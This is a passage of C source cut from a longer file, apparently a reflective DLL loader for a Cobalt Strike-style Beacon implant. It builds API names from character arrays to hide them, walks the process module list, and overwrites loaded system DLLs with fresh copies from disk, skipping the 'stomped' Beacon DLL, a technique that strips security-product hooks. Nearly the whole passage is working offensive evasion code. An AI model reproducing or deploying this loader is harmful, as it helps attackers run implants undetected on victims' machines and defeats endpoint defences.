    // call our respective entry point, fudging our hInstance value
#ifdef REFLECTIVEDLLINJECTION_VIA_LOADREMOTELIBRARYR
    // if we are injecting a DLL via LoadRemoteLibraryR we call DllMain and pass in our parameter (via the DllMain lpReserved parameter)
    ((DLLMAIN)uiValueA)( (HINSTANCE)uiBaseAddress, DLL_PROCESS_ATTACH, lpParameter );
#else
    // if we are injecting an DLL via a stub we call DllMain with no parameter
    ((DLLMAIN)uiValueA)( (HINSTANCE)uiBaseAddress, DLL_PROCESS_ATTACH, NULL );
#endif

    // STEP 8: return our new entry point address so whatever called us can call DllMain() if needed.
    return uiValueA;
}


//===============================================================================================//



__forceinline _PPEB GetProcessEnvironmentBlock()
{
    ULONG_PTR pPeb;
#ifdef _WIN64
    pPeb = __readgsqword(0x60);
#else
#ifdef WIN_ARM
    pPeb = *(DWORD*)((BYTE*)_MoveFromCoprocessor(15, 0, 13, 0, 2) + 0x30);
#else _WIN32
    pPeb = __readfsdword(0x30);
#endif
#endif
    return (_PPEB)pPeb;
}

__forceinline PLDR_DATA_TABLE_ENTRY GetInMemoryOrderModuleList()
{
    return (PLDR_DATA_TABLE_ENTRY)GetProcessEnvironmentBlock()->pLdr->InMemoryOrderModuleList.Flink;
}

__forceinline PWCHAR GetRedirectedName(struct FunctionPointers* fptrs, const PWSTR wszImportingModule, const PWSTR wszVirtualModule, SIZE_T* stSize)
{
    PAPI_SET_NAMESPACE_ARRAY_V2 pApiSetMap;
    pApiSetMap = (PAPI_SET_NAMESPACE_ARRAY_V2)GetProcessEnvironmentBlock()->pFreeList;
    *stSize = 0;

    if (pApiSetMap->Version == 6)
        return GetRedirectedName_V6(fptrs, wszImportingModule, wszVirtualModule, stSize);
    else if (pApiSetMap->Version == 4)
        return GetRedirectedName_V4(fptrs, wszImportingModule, wszVirtualModule, stSize);
    else if (pApiSetMap->Version == 2)
        return GetRedirectedName_V2(fptrs, wszImportingModule, wszVirtualModule, stSize);
    else
        return NULL;
}

__forceinline PWCHAR GetRedirectedName_V6(struct FunctionPointers* fptrs, const PWSTR wszImportingModule, const PWSTR wszVirtualModule, SIZE_T* stSize)
{
    PAPI_SET_NAMESPACE_ARRAY_V6 pApiSetMap;
    PAPI_SET_NAMESPACE_ENTRY_V6 pApiEntry;
    PAPI_SET_VALUE_ENTRY_V6 pApiValue;
    PAPI_SET_VALUE_ENTRY_V6 pApiArray;
    DWORD dwEntryCount;
    LONG dwSetCount;
    PWSTR wsEntry;
    PWSTR wsName;
    PWSTR wsValue;

    pApiSetMap = (PAPI_SET_NAMESPACE_ARRAY_V6)GetProcessEnvironmentBlock()->pFreeList;

    // Loop through each entry in the ApiSetMap to find the matching redirected module entry
    for (dwEntryCount = 0; dwEntryCount < pApiSetMap->Count; dwEntryCount++)
    {
        pApiEntry = &pApiSetMap->Array[dwEntryCount];
        wsEntry = (PWSTR)((PCHAR)pApiSetMap + pApiEntry->NameOffset);

        // Skip this entry if it does not match
        if (fptrs->p_wcsnicmp(wsEntry, wszVirtualModule, pApiEntry->NameLength / 2) != 0)
            continue;

        pApiArray = (PAPI_SET_VALUE_ENTRY_V6)((PCHAR)pApiSetMap + pApiEntry->DataOffset);

        // Loop through each value entry from the end and find where the importing module matches the ``Name`` entry
        // If the ``Name`` entry is empty, it is the default entry @ index = 0
        for (dwSetCount = pApiEntry->Count - 1; dwSetCount >= 0; dwSetCount--)
        {
            // pApiValue = (PAPI_SET_VALUE_ENTRY_V6)((PCHAR)pApiSetMap + pApiEntry->DataOffset + (dwSetCount * sizeof(API_SET_VALUE_ENTRY_V6)));
            pApiValue = &pApiArray[dwSetCount];
            wsName = (PWSTR)((PCHAR)pApiSetMap + pApiValue->NameOffset);
            wsValue = (PWSTR)((PCHAR)pApiSetMap + pApiValue->ValueOffset);

            if (pApiValue->NameLength == 0 || fptrs->p_wcsnicmp(wsName, wszImportingModule, pApiValue->NameLength / 2) == 0)
            {
                *stSize = pApiValue->ValueLength / 2;
                return wsValue;
            }
        }
    }
    return NULL;
}


__forceinline PWCHAR GetRedirectedName_V4(struct FunctionPointers* fptrs, const PWSTR wszImportingModule, const PWSTR wszVirtualModule, SIZE_T* stSize)
{
    PAPI_SET_NAMESPACE_ARRAY_V4 pApiSetMap;
    PAPI_SET_NAMESPACE_ENTRY_V4 pApiEntry;
    PAPI_SET_VALUE_ARRAY_V4 pApiArray;
    PAPI_SET_VALUE_ENTRY_V4 pApiValue;
    DWORD dwEntryCount;
    LONG dwSetCount;
    PWSTR wsEntry;
    PWSTR wsName;
    PWSTR wsValue;
    PWSTR wszShortVirtualModule;

    pApiSetMap = (PAPI_SET_NAMESPACE_ARRAY_V4)GetProcessEnvironmentBlock()->pFreeList;
    wszShortVirtualModule = (PWSTR)((PWCHAR)wszVirtualModule + 4);

    for (dwEntryCount = 0; dwEntryCount < pApiSetMap->Count; dwEntryCount++)
    {
        pApiEntry = &pApiSetMap->Array[dwEntryCount];
        wsEntry = (PWSTR)((PCHAR)pApiSetMap + pApiEntry->NameOffset);

        if (fptrs->p_wcsnicmp(wsEntry, wszShortVirtualModule, pApiEntry->NameLength / 2) != 0)
            continue;

        pApiArray = (PAPI_SET_VALUE_ARRAY_V4)((PCHAR)pApiSetMap + pApiEntry->DataOffset);

        for (dwSetCount = pApiArray->Count - 1; dwSetCount >= 0; dwSetCount--)
        {
            pApiValue = &pApiArray->Array[dwSetCount];
            wsName = (PWSTR)((PCHAR)pApiSetMap + pApiValue->NameOffset);
            wsValue = (PWSTR)((PCHAR)pApiSetMap + pApiValue->ValueOffset);

            if (pApiValue->NameLength == 0 || fptrs->p_wcsnicmp(wsName, wszImportingModule, pApiValue->NameLength / 2) == 0)
            {
                *stSize = pApiValue->ValueLength / 2;
                return wsValue;
            }
        }
    }
    return NULL;
}

__forceinline PWCHAR GetRedirectedName_V2(struct FunctionPointers* fptrs, const PWSTR wszImportingModule, const PWSTR wszVirtualModule, SIZE_T* stSize)
{
    PAPI_SET_NAMESPACE_ARRAY_V2 pApiSetMap;
    PAPI_SET_NAMESPACE_ENTRY_V2 pApiEntry;
    PAPI_SET_VALUE_ARRAY_V2 pApiArray;
    PAPI_SET_VALUE_ENTRY_V2 pApiValue;
    DWORD dwEntryCount;
    LONG dwSetCount;
    PWSTR wsEntry;
    PWSTR wsName;
    PWSTR wsValue;
    PWSTR wszShortVirtualModule;

    pApiSetMap = (PAPI_SET_NAMESPACE_ARRAY_V2)GetProcessEnvironmentBlock()->pFreeList;
    wszShortVirtualModule = (PWSTR)((PWCHAR)wszVirtualModule + 4);

    for (dwEntryCount = 0; dwEntryCount < pApiSetMap->Count; dwEntryCount++)
    {
        pApiEntry = &pApiSetMap->Array[dwEntryCount];
        wsEntry = (PWSTR)((PCHAR)pApiSetMap + pApiEntry->NameOffset);

        if (fptrs->p_wcsnicmp(wsEntry, wszShortVirtualModule, pApiEntry->NameLength / 2) != 0)
            continue;

        pApiArray = (PAPI_SET_VALUE_ARRAY_V2)((PCHAR)pApiSetMap + pApiEntry->DataOffset);

        for (dwSetCount = pApiArray->Count - 1; dwSetCount >= 0; dwSetCount--)
        {
            pApiValue = &pApiArray->Array[dwSetCount];
            wsName = (PWSTR)((PCHAR)pApiSetMap + pApiValue->NameOffset);
            wsValue = (PWSTR)((PCHAR)pApiSetMap + pApiValue->ValueOffset);

            if (pApiValue->NameLength == 0 || fptrs->p_wcsnicmp(wsName, wszImportingModule, pApiValue->NameLength / 2) == 0)
            {
                *stSize = pApiValue->ValueLength / 2;
                return wsValue;
            }
        }
    }
    return NULL;
}


__forceinline BOOL IsBeaconDLL(char* stomp, size_t beaconDllLength, PWSTR wszBaseDllName, USHORT BaseDllLength)
{
    BOOL isBeacon = FALSE;
    if (beaconDllLength * 2 == BaseDllLength)
    {
        isBeacon = TRUE;
        for (int i = 0; i < beaconDllLength; i++)
        {
            // make them lower case
            char c1 = stomp[i];
            char c2 = wszBaseDllName[i];
            if (c1 >= 'A' && c1 <= 'Z')
                c1 += 32;
            if (c2 >= 'A' && c2 <= 'Z')
                c2 += 32;
            if (c1 != c2)
            {
                isBeacon = FALSE;
                break;
            }
        }
    }
    return isBeacon;
}

__forceinline BOOL ResolveOwnImports(struct FunctionPointers* fptrs, LOADLIBRARYA pLoadLibraryA, GETPROCADDRESS pGetProcAddress)
{
    char buf0[] = { 'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '\x00' };
    HMODULE hKernel32 = pLoadLibraryA(buf0);
    if (!hKernel32) {
        return FALSE;
    }

    char buf01[] = { 'm', 's', 'v', 'c', 'r', 't', '\x00' };
    HMODULE hMsvcrt = pLoadLibraryA(buf01);
    if (!hMsvcrt) {
        return FALSE;
    }

    char buf1[] = { 'f', 'r', 'e', 'e', '\x00' };
    fptrs->pfree = (FREE)pGetProcAddress(hMsvcrt, buf1);
    if (!fptrs->pfree) {
        return FALSE;
    }

    /*char buf2[] = { '_', '_', 'm', 'o', 'v', 's', 'b', '\x00' };
    __MOVSB __movsb = (__MOVSB)pGetProcAddress(hKernel32, buf2);
    if (!__movsb) {
        return FALSE;
    }*/

    char buf3[] = { 'c', 'a', 'l', 'l', 'o', 'c', '\x00' };
    fptrs->pcalloc = (CALLOC)pGetProcAddress(hMsvcrt, buf3);
    if (!fptrs->pcalloc) {
        return FALSE;
    }

    char buf4[] = { 'm', 'b', 's', 't', 'o', 'w', 'c', 's', '_', 's', '\x00' };
    fptrs->pmbstowcs_s = (MBSTOWCS_S)pGetProcAddress(hMsvcrt, buf4);
    if (!fptrs->pmbstowcs_s) {
        return FALSE;
    }

    char buf5[] = { '_', 'w', 'c', 's', 'n', 'i', 'c', 'm', 'p', '\x00' };
    fptrs->p_wcsnicmp = (_WCSNICMP)pGetProcAddress(hMsvcrt, buf5);
    if (!fptrs->p_wcsnicmp) {
        return FALSE;
    }

    char buf6[] = { 's', 't', 'r', 'l', 'e', 'n', '\x00' };
    fptrs->pstrlen = (STRLEN)pGetProcAddress(hMsvcrt, buf6);
    if (!fptrs->pstrlen) {
        return FALSE;
    }

    char buf7[] = { 's', 't', 'r', 'c', 'm', 'p', '\x00' };
    fptrs->pstrcmp = (STRCMP)pGetProcAddress(hMsvcrt, buf7);
    if (!fptrs->pstrcmp) {
        return FALSE;
    }

    char buf8[] = { 'w', 'c', 's', 'c', 'm', 'p', '\x00' };
    fptrs->pwcscmp = (WCSCMP)pGetProcAddress(hMsvcrt, buf8);
    if (!fptrs->pwcscmp) {
        return FALSE;
    }

    char buf9[] = { 'm', 'e', 'm', 'c', 'm', 'p', '\x00' };
    fptrs->pmemcmp = (MEMCMP)pGetProcAddress(hMsvcrt, buf9);
    if (!fptrs->pmemcmp) {
        return FALSE;
    }

    char buf10[] = { 's', 't', 'r', 's', 't', 'r', '\x00' };
    fptrs->pstrstr = (STRSTR)pGetProcAddress(hMsvcrt, buf10);
    if (!fptrs->pstrstr) {
        return FALSE;
    }

    char buf11[] = { 's', 't', 'r', 'n', 'l', 'e', 'n', '\x00' };
    fptrs->pstrnlen = (STRNLEN)pGetProcAddress(hMsvcrt, buf11);
    if (!fptrs->pstrnlen) {
        return FALSE;
    }

    char buf12[] = { 'V', 'i', 'r', 't', 'u', 'a', 'l', 'F', 'r', 'e', 'e', '\x00' };
    fptrs->pVirtualFree = (VIRTUALFREE)pGetProcAddress(hKernel32, buf12);
    if (!fptrs->pVirtualFree) {
        return FALSE;
    }

    char buf13[] = { 'C', 'r', 'e', 'a', 't', 'e', 'F', 'i', 'l', 'e', 'W', '\x00' };
    fptrs->pCreateFileW = (CREATEFILEW)pGetProcAddress(hKernel32, buf13);
    if (!fptrs->pCreateFileW) {
        return FALSE;
    }

    char buf14[] = { 'C', 'r', 'e', 'a', 't', 'e', 'F', 'i', 'l', 'e', 'M', 'a', 'p', 'p', 'i', 'n', 'g', 'W', '\x00' };
    fptrs->pCreateFileMappingW = (CREATEFILEMAPPINGW)pGetProcAddress(hKernel32, buf14);
    if (!fptrs->pCreateFileMappingW) {
        return FALSE;
    }

    char buf15[] = { 'M', 'a', 'p', 'V', 'i', 'e', 'w', 'O', 'f', 'F', 'i', 'l', 'e', '\x00' };
    fptrs->pMapViewOfFile = (MAPVIEWOFFILE)pGetProcAddress(hKernel32, buf15);
    if (!fptrs->pMapViewOfFile) {
        return FALSE;
    }

    char buf16[] = { 'V', 'i', 'r', 't', 'u', 'a', 'l', 'A', 'l', 'l', 'o', 'c', '\x00' };
    fptrs->pVirtualAlloc = (VIRTUALALLOC)pGetProcAddress(hKernel32, buf16);
    if (!fptrs->pVirtualAlloc) {
        return FALSE;
    }

    char buf17[] = { 'U', 'n', 'm', 'a', 'p', 'V', 'i', 'e', 'w', 'O', 'f', 'F', 'i', 'l', 'e', '\x00' };
    fptrs->pUnmapViewOfFile = (UNMAPVIEWOFFILE)pGetProcAddress(hKernel32, buf17);
    if (!fptrs->pUnmapViewOfFile) {
        return FALSE;
    }

    char buf18[] = { 'C', 'l', 'o', 's', 'e', 'H', 'a', 'n', 'd', 'l', 'e', '\x00' };
    fptrs->pCloseHandle = (CLOSEHANDLE)pGetProcAddress(hKernel32, buf18);
    if (!fptrs->pCloseHandle) {
        return FALSE;
    }

    char buf19[] = { 'L', 'o', 'a', 'd', 'L', 'i', 'b', 'r', 'a', 'r', 'y', 'W', '\x00' };
    fptrs->pLoadLibraryW = (LOADLIBRARYW)pGetProcAddress(hKernel32, buf19);
    if (!fptrs->pLoadLibraryW) {
        return FALSE;
    }

    char buf20[] = { 'V', 'i', 'r', 't', 'u', 'a', 'l', 'P', 'r', 'o', 't', 'e', 'c', 't', '\x00' };
    fptrs->pVirtualProtect = (VIRTUALPROTECT)pGetProcAddress(hKernel32, buf20);
    if (!fptrs->pVirtualProtect) {
        return FALSE;
    }

    char buf21[] = { 'G', 'e', 't', 'M', 'o', 'd', 'u', 'l', 'e', 'H', 'a', 'n', 'd', 'l', 'e', 'W', '\x00' };
    fptrs->pGetModuleHandleW = (GETMODULEHANDLEW)pGetProcAddress(hKernel32, buf21);
    if (!fptrs->pGetModuleHandleW) {
        return FALSE;
    }

    char buf22[] = { 'O', 'u', 't', 'p', 'u', 't', 'D', 'e', 'b', 'u', 'g', 'S', 't', 'r', 'i', 'n', 'g', 'A', '\x00' };
    fptrs->pOutputDebugStringA = (OUTPUTDEBUGSTR)pGetProcAddress(hKernel32, buf22);
    if (!fptrs->pOutputDebugStringA) {
        return FALSE;
    }

    return TRUE;
}

__forceinline BOOL RefreshPE(char* stomp, LOADLIBRARYA pLoadLibraryA, GETPROCADDRESS pGetProcAddress)
{
    HMODULE hModule;
    PWSTR wszFullDllName;
    PWSTR wszBaseDllName;
    ULONG_PTR pDllBase;

    PLDR_DATA_TABLE_ENTRY pLdteHead = NULL;
    PLDR_DATA_TABLE_ENTRY pLdteCurrent = NULL;

    struct FunctionPointers fptrs;

    for (unsigned int i = 0; i < sizeof(struct FunctionPointers); i++)
    {
        ((char*)&fptrs)[i] = 0;
    }

    if (!ResolveOwnImports(&fptrs, pLoadLibraryA, pGetProcAddress))
    {
        return FALSE;
    }

    size_t beaconDllLength = fptrs.pstrlen(stomp);

    pLdteHead = GetInMemoryOrderModuleList();
    pLdteCurrent = pLdteHead;

    do {
        if (pLdteCurrent->FullDllName.Length > 2 && !IsBeaconDLL(stomp, beaconDllLength, pLdteCurrent->BaseDllName.pBuffer, pLdteCurrent->BaseDllName.Length))
        {
            wszFullDllName = pLdteCurrent->FullDllName.pBuffer;
            wszBaseDllName = pLdteCurrent->BaseDllName.pBuffer;
            pDllBase = (ULONG_PTR)pLdteCurrent->DllBase;

            hModule = CustomLoadLibrary(&fptrs, wszFullDllName, wszBaseDllName, pDllBase);

            if (hModule)
            {
                ScanAndFixModule(&fptrs, (PCHAR)hModule, (PCHAR)pDllBase, wszBaseDllName);
                fptrs.pVirtualFree(hModule, 0, MEM_RELEASE);
            }
        }
        pLdteCurrent = (PLDR_DATA_TABLE_ENTRY)pLdteCurrent->InMemoryOrderModuleList.Flink;
    } while (pLdteCurrent != pLdteHead);

    return TRUE;
}

__forceinline HMODULE CustomLoadLibrary(struct FunctionPointers* fptrs, const PWCHAR wszFullDllName, const PWCHAR wszBaseDllName, ULONG_PTR pDllBase)
{
    // File handles
    HANDLE hFile = INVALID_HANDLE_VALUE;
    HANDLE hMap = NULL;
    PCHAR pFile = NULL;

    // PE headers
    PIMAGE_DOS_HEADER pDosHeader;
    PIMAGE_NT_HEADERS pNtHeader;
    PIMAGE_SECTION_HEADER pSectionHeader;

    // Library 
    PCHAR pLibraryAddr = NULL;
    DWORD dwIdx;

    // Relocation
    PIMAGE_DATA_DIRECTORY pDataDir;
    PIMAGE_BASE_RELOCATION pBaseReloc;
    ULONG_PTR pReloc;
    DWORD dwNumRelocs;
    ULONG_PTR pInitialImageBase;
    PIMAGE_RELOC pImageReloc;

    // Import
    PIMAGE_IMPORT_DESCRIPTOR pImportDesc;
    PCHAR szDllName;
    SIZE_T stDllName;
    PWSTR wszDllName = NULL;
    PWCHAR wsRedir = NULL;
    PWSTR wszRedirName = NULL;
    SIZE_T stRedirName;
    SIZE_T stSize;

    HMODULE hModule;
    PIMAGE_THUNK_DATA pThunkData;
    FARPROC* pIatEntry;

    // clr.dll hotpatches itself at runtime for performance reasons, so skip it
    WCHAR buf1[] = {L'c', L'l', L'r', L'.', L'd', L'l', L'l', 0};

    if (fptrs->pwcscmp(buf1, wszBaseDllName) == 0)
        goto cleanup;

    // ----
    // Step 1: Map the file into memory
    // ----

    hFile = fptrs->pCreateFileW(wszFullDllName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE)
        goto cleanup;

    hMap = fptrs->pCreateFileMappingW(hFile, NULL, PAGE_READONLY, 0, 0, NULL);
    if (hMap == NULL)
        goto cleanup;

    pFile = (PCHAR)fptrs->pMapViewOfFile(hMap, FILE_MAP_READ, 0, 0, 0);
    if (pFile == NULL)
        goto cleanup;

    // ----
    // Step 2: Parse the file headers and load it into memory
    // ----
    pDosHeader = (PIMAGE_DOS_HEADER)pFile;
    pNtHeader = (PIMAGE_NT_HEADERS)(pFile + pDosHeader->e_lfanew);

    // allocate memory to copy DLL into
    pLibraryAddr = (PCHAR)fptrs->pVirtualAlloc(NULL, pNtHeader->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    // copy header
    __movsb((PBYTE)pLibraryAddr, (PBYTE)pFile, pNtHeader->OptionalHeader.SizeOfHeaders);

    // copy sections
    pSectionHeader = (PIMAGE_SECTION_HEADER)(pFile + pDosHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS));
    for (dwIdx = 0; dwIdx < pNtHeader->FileHeader.NumberOfSections; dwIdx++)
    {
        __movsb((PBYTE)(pLibraryAddr + pSectionHeader[dwIdx].VirtualAddress),
            (PBYTE)(pFile + pSectionHeader[dwIdx].PointerToRawData),
            pSectionHeader[dwIdx].SizeOfRawData);
    }

    // update our pointers to the loaded image
    pDosHeader = (PIMAGE_DOS_HEADER)pLibraryAddr;
    pNtHeader = (PIMAGE_NT_HEADERS)(pLibraryAddr + pDosHeader->e_lfanew);

    // ----
    // Step 3: Calculate relocations
    // ----

    pDataDir = &pNtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
    pInitialImageBase = pNtHeader->OptionalHeader.ImageBase;
    // set the ImageBase to the already loaded module's base
    pNtHeader->OptionalHeader.ImageBase = pDllBase;

    // check if their are any relocations present
    if (pDataDir->Size)
    {
        // calculate the address of the first IMAGE_BASE_RELOCATION entry
        pBaseReloc = (PIMAGE_BASE_RELOCATION)(pLibraryAddr + pDataDir->VirtualAddress);

        // iterate through each relocation entry
        while ((PCHAR)pBaseReloc < (pLibraryAddr + pDataDir->VirtualAddress + pDataDir->Size) && pBaseReloc->SizeOfBlock)
        {
            // the VA for this relocation block
            pReloc = (ULONG_PTR)(pLibraryAddr + pBaseReloc->VirtualAddress);

            // number of entries in this relocation block
            dwNumRelocs = (pBaseReloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(IMAGE_RELOC);

            // first entry in the current relocation block
            pImageReloc = (PIMAGE_RELOC)((PCHAR)pBaseReloc + sizeof(IMAGE_BASE_RELOCATION));

            // iterate through each entry in the relocation block
            while (dwNumRelocs--)
            {
                // perform the relocation, skipping IMAGE_REL_BASED_ABSOLUTE as required.
                // we subtract the initial ImageBase and add in the original dll base
                if (pImageReloc->type == IMAGE_REL_BASED_DIR64)
                {
                    *(ULONG_PTR*)(pReloc + pImageReloc->offset) -= pInitialImageBase;
                    *(ULONG_PTR*)(pReloc + pImageReloc->offset) += pDllBase;
                }
                else if (pImageReloc->type == IMAGE_REL_BASED_HIGHLOW)
                {
                    *(DWORD*)(pReloc + pImageReloc->offset) -= (DWORD)pInitialImageBase;
                    *(DWORD*)(pReloc + pImageReloc->offset) += (DWORD)pDllBase;
                }
                else if (pImageReloc->type == IMAGE_REL_BASED_HIGH)
                {
                    *(WORD*)(pReloc + pImageReloc->offset) -= HIWORD(pInitialImageBase);
                    *(WORD*)(pReloc + pImageReloc->offset) += HIWORD(pDllBase);
                }
                else if (pImageReloc->type == IMAGE_REL_BASED_LOW)
                {
                    *(WORD*)(pReloc + pImageReloc->offset) -= LOWORD(pInitialImageBase);
                    *(WORD*)(pReloc + pImageReloc->offset) += LOWORD(pDllBase);
                }

                // get the next entry in the current relocation block
                pImageReloc = (PIMAGE_RELOC)((PCHAR)pImageReloc + sizeof(IMAGE_RELOC));
            }

            // get the next entry in the relocation directory
            pBaseReloc = (PIMAGE_BASE_RELOCATION)((PCHAR)pBaseReloc + pBaseReloc->SizeOfBlock);
        }
    }

    // ----
    // Step 4: Update import table
    // ----

    pDataDir = &pNtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    if (pDataDir->Size)
    {
        pImportDesc = (PIMAGE_IMPORT_DESCRIPTOR)(pLibraryAddr + pDataDir->VirtualAddress);

        while (pImportDesc->Characteristics)
        {
            hModule = NULL;
            wszDllName = NULL;
            szDllName = (PCHAR)(pLibraryAddr + pImportDesc->Name);
            stDllName = fptrs->pstrnlen(szDllName, MAX_PATH);
            wszDllName = (PWSTR)fptrs->pcalloc(stDllName + 1, sizeof(WCHAR));

            if (wszDllName == NULL)
                goto next_import;

            fptrs->pmbstowcs_s(&stSize, wszDllName, stDllName + 1, szDllName, stDllName);

            // If the DLL starts with api- or ext-, resolve the redirected name and load it
            WCHAR buf2[] = {L'a', L'p', L'i', L'-', 0};
            WCHAR buf3[] = {L'e', L'x', L't', L'-', 0};
            if (fptrs->p_wcsnicmp(wszDllName, buf2, 4) == 0 || fptrs->p_wcsnicmp(wszDllName, buf3, 4) == 0)
            {
                // wsRedir is not null terminated
                wsRedir = GetRedirectedName(fptrs, wszBaseDllName, wszDllName, &stRedirName);
                if (wsRedir)
                {
                    // Free the original wszDllName and allocate a new buffer for the redirected dll name
                    fptrs->pfree(wszDllName);
                    wszDllName = (PWSTR)fptrs->pcalloc(stRedirName + 1, sizeof(WCHAR));
                    if (wszDllName == NULL)
                        goto next_import;

                    __movsb((PBYTE)wszDllName, (PBYTE)wsRedir, stRedirName * sizeof(WCHAR));
                }
            }

            // Load the module
            hModule = CustomGetModuleHandleW(fptrs, wszDllName);

            // Ignore libraries that fail to load
            if (hModule == NULL)
                goto next_import;

            if (pImportDesc->OriginalFirstThunk)
                pThunkData = (PIMAGE_THUNK_DATA)(pLibraryAddr + pImportDesc->OriginalFirstThunk);
            else
                pThunkData = (PIMAGE_THUNK_DATA)(pLibraryAddr + pImportDesc->FirstThunk);

            pIatEntry = (FARPROC*)(pLibraryAddr + pImportDesc->FirstThunk);

            // loop through each thunk and resolve the import
            for (; DEREF(pThunkData); pThunkData++, pIatEntry++)
            {
                if (IMAGE_SNAP_BY_ORDINAL(pThunkData->u1.Ordinal))
                    *pIatEntry = CustomGetProcAddressEx(fptrs, hModule, (PCHAR)IMAGE_ORDINAL(pThunkData->u1.Ordinal), wszDllName);
                else
                    *pIatEntry = CustomGetProcAddressEx(fptrs, hModule, ((PIMAGE_IMPORT_BY_NAME)(pLibraryAddr + DEREF(pThunkData)))->Name, wszDllName);
            }

        next_import:
            if (wszDllName != NULL)
            {
                fptrs->pfree(wszDllName);
                wszDllName = NULL;
            }
            pImportDesc = (PIMAGE_IMPORT_DESCRIPTOR)((PCHAR)pImportDesc + sizeof(IMAGE_IMPORT_DESCRIPTOR));

        }
    }

cleanup:
    if (pFile != NULL)
        fptrs->pUnmapViewOfFile(pFile);
    if (hMap != NULL)
        fptrs->pCloseHandle(hMap);
    if (hFile != INVALID_HANDLE_VALUE)
        fptrs->pCloseHandle(hFile);

    return (HMODULE)pLibraryAddr;
}

__forceinline HMODULE CustomGetModuleHandleW(struct FunctionPointers* fptrs, const PWSTR wszModule)
{
    HMODULE hModule = NULL;
    PLDR_DATA_TABLE_ENTRY pLdteHead = NULL;
    PLDR_DATA_TABLE_ENTRY pLdteCurrent = NULL;

    pLdteCurrent = pLdteHead = GetInMemoryOrderModuleList();

    do {
        if (pLdteCurrent->FullDllName.Length > 2 &&
            fptrs->p_wcsnicmp(wszModule, pLdteCurrent->BaseDllName.pBuffer, pLdteCurrent->BaseDllName.Length / 2) == 0)
        {
            return ((HMODULE)pLdteCurrent->DllBase);
        }
        pLdteCurrent = (PLDR_DATA_TABLE_ENTRY)pLdteCurrent->InMemoryOrderModuleList.Flink;
    } while (pLdteCurrent != pLdteHead);

    return fptrs->pLoadLibraryW(wszModule);
}

__forceinline VOID ScanAndFixModule(struct FunctionPointers* fptrs, PCHAR pKnown, PCHAR pSuspect, PWCHAR wszBaseDllName)
{
    // PE headers
    PIMAGE_DOS_HEADER pDosHeader;
    PIMAGE_NT_HEADERS pNtHeader;
    PIMAGE_SECTION_HEADER pSectionHeader;

    DWORD dwIdx;

    pDosHeader = (PIMAGE_DOS_HEADER)pKnown;
    pNtHeader = (PIMAGE_NT_HEADERS)(pKnown + pDosHeader->e_lfanew);

    // Scan PE header
    char buf0[] = {'H', 'e', 'a', 'd', 'e', 'r', 0};
    char buf2[] = {'.', 't', 'e', 'x', 't', 0};
    WCHAR buf1[] = {L'c', L'l', L'r', L'.', L'd', L'l', L'l', 0};
    ScanAndFixSection(fptrs, wszBaseDllName, buf0, pKnown, pSuspect, pNtHeader->OptionalHeader.SizeOfHeaders);

    // Scan each section
    pSectionHeader = (PIMAGE_SECTION_HEADER)(pKnown + pDosHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS));
    for (dwIdx = 0; dwIdx < pNtHeader->FileHeader.NumberOfSections; dwIdx++)
    {
        if (pSectionHeader[dwIdx].Characteristics & IMAGE_SCN_MEM_WRITE)
            continue;

        if (!((fptrs->pwcscmp(wszBaseDllName, buf1) == 0 && fptrs->pstrcmp((const char*)pSectionHeader[dwIdx].Name, buf2) == 0)))
        {
            ScanAndFixSection(fptrs, wszBaseDllName, (PCHAR)pSectionHeader[dwIdx].Name, pKnown + pSectionHeader[dwIdx].VirtualAddress,
                pSuspect + pSectionHeader[dwIdx].VirtualAddress, pSectionHeader[dwIdx].Misc.VirtualSize);
        }
    }
}

__forceinline VOID ScanAndFixSection(struct FunctionPointers* fptrs, PWCHAR dll, PCHAR szSectionName, PCHAR pKnown, PCHAR pSuspect, size_t stLength)
{
    DWORD ddOldProtect;

    if (fptrs->pmemcmp(pKnown, pSuspect, stLength) != 0)
    {
        if (!fptrs->pVirtualProtect(pSuspect, stLength, PAGE_EXECUTE_READWRITE, &ddOldProtect))
            return;

        __movsb((PBYTE)pSuspect, (PBYTE)pKnown, stLength);

        fptrs->pVirtualProtect(pSuspect, stLength, ddOldProtect, &ddOldProtect);
    }
}


// This code is modified from Stephen Fewer's GetProcAddress implementation
//===============================================================================================//
// Copyright (c) 2013, Stephen Fewer of Harmony Security (www.harmonysecurity.com)
// All rights reserved.
// 
// Redistribution and use in source and binary forms, with or without modification, are permitted 
// provided that the following conditions are met:
// 
//     * Redistributions of source code must retain the above copyright notice, this list of 
// conditions and the following disclaimer.
// 
//     * Redistributions in binary form must reproduce the above copyright notice, this list of 
// conditions and the following disclaimer in the documentation and/or other materials provided 
// with the distribution.
// 
//     * Neither the name of Harmony Security nor the names of its contributors may be used to
// endorse or promote products derived from this software without specific prior written permission.
// 
// THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS OR 
// IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND
// FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR 
// CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR 
// CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR 
// SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY 
// THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR 
// OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE 
// POSSIBILITY OF SUCH DAMAGE.
//===============================================================================================//
__forceinline FARPROC WINAPI CustomGetProcAddressEx(struct FunctionPointers* fptrs, HMODULE hModule, const PCHAR lpProcName, PWSTR wszOriginalModule)
{
    UINT_PTR uiLibraryAddress = 0;
